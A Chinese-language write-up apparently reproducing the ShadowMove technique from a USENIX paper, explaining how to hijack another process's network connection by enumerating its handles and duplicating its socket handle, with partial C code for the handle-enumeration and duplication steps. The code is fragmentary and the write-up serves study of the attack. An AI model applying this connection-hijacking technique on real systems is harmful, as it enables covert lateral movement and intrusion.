# ShadowMove复现与思考

## 简介

前段时间有几位老哥联名发了一篇论文，这篇论文描述了一种复制套接字劫持网络连接的技术，本文旨在于简单分析复现这种技术，如有错误欢迎指正。

作者给出的理论图如下，通过创建两个基于原套接字复制的套接字，定期挂起原套接字接收和响应特殊的数据包。

![](../.gitbook/assets/image%20%28206%29.png)

## 复现过程

尽管windows本身提供了WSADuplicateSocket函数，但是这个函数需要本地进程的socks句柄，而句柄只在本地进程才有意义，这篇文章的作者提出了一种从远程复制句柄技术的变体。

作者发现套接字的句柄等同于的名为\Device\Afd文件句柄，这个句柄可以直接是为socks使用\(虽然就是同一个，但说还是这么说\)，我们可以通过常规的句柄枚举技术从远程进程得到它，然后使用NtDuplicateObject函数将它复制到本地进程，本地进程再通过WSADuplicateSocket获取克隆套接字需要的参数，然后我们可以像使用自己的socket一样使用这个克隆过来的socket了。

![](../.gitbook/assets/image%20%28205%29.png)

在github有师傅分享了一份ShadowMove的代码，这里我做了一点简化。

首先师傅获取了远程进程的所有句柄。

```text
    //获取远程线程内所有句柄
    pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)calloc(SystemInformationLength, sizeof(UCHAR));
    while (pNtQuerySystemInformation(SystemHandleInformation,
                                     pSysHandleInfo,
                                     SystemInformationLength,
                                     &ReturnLength) == STATUS_INFO_LENGTH_MISMATCH) {
        free(pSysHandleInfo);
        SystemInformationLength = ReturnLength;
        pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)calloc(SystemInformationLength, sizeof(UCHAR));
    }

```

获取句柄之后将所有句柄克隆到了当前进程\(句柄只有在本地进程才有意义\)，对这个句柄的类型做了一个判断。\(这里我简单的做了一个优化，作者的源代码是判断所有句柄类型不等于0x28的句柄，其实所有\drivice\开头的文件句柄都是OB\_TYPE\_DEVICE, // 25,设备类型\)。

```text

    for (size_t i = 0; i < pSysHandleInfo->NumberOfHandles; i++) 
    {
        //句柄只在拥有者进程内有意义，所以这里需要通过NtDuplicateObject函数将句柄复制到当前进程
        if (pSysHandleInfo->Handles[i].ObjectTypeIndex == 0x25) {
            ntStatus = pNtDuplicateObject(hProcess,
                                          (HANDLE)pSysHandleInfo->Handles[i].HandleValue,
                                          GetCurrentProcess(),
                                          &TargetHandle,
                                          PROCESS_ALL_ACCESS, 
                                          FALSE,
                                          DUPLICATE_SAME_ACCESS);

            if (ntStatus == STATUS_SUCCESS) {
                pObjNameInfo = (POBJECT_NAME_INFORMATION)calloc(ObjectInformationLength, sizeof(UCHAR));

                if (NULL == pObjNameInfo) {
                    CloseHandle(TargetHandle);
                    free(pSysHandleInfo);
                    pSysHandleInfo = NULL;

                    return TargetSocket;
                }
```

## LINKS

原文如下:

{% embed url="https://www.usenix.org/system/files/sec20summer\_niakanlahiji\_prepub.pdf" %}







